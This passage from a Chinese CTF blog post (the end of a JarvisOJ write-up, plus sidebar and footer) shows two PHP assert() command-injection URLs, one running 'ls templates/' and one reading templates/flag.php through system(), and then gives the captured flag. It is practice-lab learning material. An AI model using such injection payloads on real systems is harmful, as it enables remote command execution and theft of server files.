<p><img src="https://i.loli.net/2018/02/16/5a868e91bd7df.jpg" alt=""><br><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:<span class="regexp">//</span>web.jarvisoj.com:<span class="number">32798</span><span class="regexp">/?page=flag'.system("ls templates/</span>;<span class="string">").'</span></span><br></pre></td></tr></table></figure></p>
<p><img src="https://i.loli.net/2018/02/16/5a868e91dc52e.jpg" alt=""><br><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:<span class="regexp">//</span>web.jarvisoj.com:<span class="number">32798</span><span class="regexp">/?page=flag'.system("cat templates/</span>flag.php;<span class="string">").'</span></span><br></pre></td></tr></table></figure></p>
<p>这里差一点就被骗了，因为执行以后页面显示的还是That file doesn’t exist!但是机智的我还是右键源码了一下…所以flag到手。<br><img src="https://i.loli.net/2018/02/16/5a868e91efb5e.jpg" alt=""><br>flag:61dctf{8e_careful_when_us1ng_ass4rt}</p>
<p>暂时就先写到这里，后续做了会把做好的题目加上去~</p>

      
    </div>
    <footer class="article-footer">
      <a data-url="http://yoursite.com/2018/02/15/JarvisOJ/" data-id="cjk0t3vea000n9cv4j3e640yq" class="article-share-link">Compartir</a>
      
      
  <ul class="article-tag-list"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/CTF-Web/">CTF_Web</a></li></ul>

    </footer>
  </div>
  
</article>


  


  <nav id="page-nav">
    
    <a class="extend prev" rel="prev" href="/">&laquo; Previo</a><a class="page-number" href="/">1</a><span class="page-number current">2</span><a class="page-number" href="/page/3/">3</a><a class="extend next" rel="next" href="/page/3/">Siguiente &raquo;</a>
  </nav>

</section>
        
          <aside id="sidebar">
  
    
  <div class="widget-wrap">
    <h3 class="widget-title">Categorías</h3>
    <div class="widget">
      <ul class="category-list"><li class="category-list-item"><a class="category-list-link" href="/categories/AI-Learning/">AI_Learning</a></li><li class="category-list-item"><a class="category-list-link" href="/categories/Algorithm/">Algorithm</a></li><li class="category-list-item"><a class="category-list-link" href="/categories/CTF/">CTF</a></li><li class="category-list-item"><a class="category-list-link" href="/categories/HTML/">HTML</a></li><li class="category-list-item"><a class="category-list-link" href="/categories/XSS漏洞学习/">XSS漏洞学习</a></li><li class="category-list-item"><a class="category-list-link" href="/categories/代码审计/">代码审计</a></li><li class="category-list-item"><a class="category-list-link" href="/categories/漏洞学习/">漏洞学习</a></li><li class="category-list-item"><a class="category-list-link" href="/categories/环境配置/">环境配置</a></li></ul>
    </div>
  </div>


  
    
  <div class="widget-wrap">
    <h3 class="widget-title">Tags</h3>
    <div class="widget">
      <ul class="tag-list"><li class="tag-list-item"><a class="tag-list-link" href="/tags/Algorithm/">Algorithm</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/C/">C++</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/CTF-Web/">CTF_Web</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/HTML/">HTML</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/JavaScript/">JavaScript</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/NLP/">NLP</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/PHP/">PHP</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/SQL-injection/">SQL_injection</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/XXE/">XXE</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/凸包算法/">凸包算法</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/大数据/">大数据</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/微信小程序/">微信小程序</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/杂谈/">杂谈</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/环境配置/">环境配置</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/算法考核/">算法考核</a></li></ul>
    </div>
  </div>


  
    
  <div class="widget-wrap">
    <h3 class="widget-title">Nube de Tags</h3>
    <div class="widget tagcloud">
      <a href="/tags/Algorithm/" style="font-size: 13.33px;">Algorithm</a> <a href="/tags/C/" style="font-size: 10px;">C++</a> <a href="/tags/CTF-Web/" style="font-size: 20px;">CTF_Web</a> <a href="/tags/HTML/" style="font-size: 10px;">HTML</a> <a href="/tags/JavaScript/" style="font-size: 10px;">JavaScript</a> <a href="/tags/NLP/" style="font-size: 10px;">NLP</a> <a href="/tags/PHP/" style="font-size: 10px;">PHP</a> <a href="/tags/SQL-injection/" style="font-size: 16.67px;">SQL_injection</a> <a href="/tags/XXE/" style="font-size: 10px;">XXE</a> <a href="/tags/凸包算法/" style="font-size: 10px;">凸包算法</a> <a href="/tags/大数据/" style="font-size: 10px;">大数据</a> <a href="/tags/微信小程序/" style="font-size: 10px;">微信小程序</a> <a href="/tags/杂谈/" style="font-size: 10px;">杂谈</a> <a href="/tags/环境配置/" style="font-size: 10px;">环境配置</a> <a href="/tags/算法考核/" style="font-size: 10px;">算法考核</a>
    </div>
  </div>

  
    
  <div class="widget-wrap">
    <h3 class="widget-title">Archivos</h3>
    <div class="widget">
      <ul class="archive-list"><li class="archive-list-item"><a class="archive-list-link" href="/archives/2018/07/">July 2018</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2018/05/">May 2018</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2018/03/">March 2018</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2018/02/">February 2018</a></li></ul>
    </div>
  </div>


  
    
  <div class="widget-wrap">
    <h3 class="widget-title">Posts recientes</h3>
    <div class="widget">
      <ul>
        
          <li>
            <a href="/2018/07/23/一些假期电影杂谈/">一些假期电影杂谈</a>
          </li>
        
          <li>
            <a href="/2018/07/23/微信小程序开发学习记录-一/">微信小程序开发学习记录(一)</a>
          </li>
        
          <li>
            <a href="/2018/07/15/C-STL相关库应用实例/">C++ STL相关库应用实例</a>
          </li>
        
          <li>
            <a href="/2018/07/06/CCF-CSP备考刷题记录/">CCF CSP备考刷题记录</a>
          </li>
        
          <li>
            <a href="/2018/05/25/凤凰金融/">凤凰金融量化投资比赛-预赛总结</a>
          </li>
        
      </ul>
    </div>
  </div>

  
</aside>
        
      </div>
      <footer id="footer">
  
  <div class="outer">
    <div id="footer-info" class="inner">
      &copy; 2018 Klaus<br>
      Construido por <a href="http://hexo.io/" target="_blank">Hexo</a>
    </div>
  </div>
</footer>
    </div>
    <nav id="mobile-nav">
  
    <a href="/" class="mobile-nav-link">Home</a>
  
    <a href="/archives" class="mobile-nav-link">Archives</a>
  
</nav>
    

<script src="//ajax.googleapis.com/ajax/libs/jquery/2.0.3/jquery.min.js"></script>


  <link rel="stylesheet" href="/fancybox/jquery.fancybox.css">
  <script src="/fancybox/jquery.fancybox.pack.js"></script>


<script src="/js/script.js"></script>



  </div>
</body>
</html>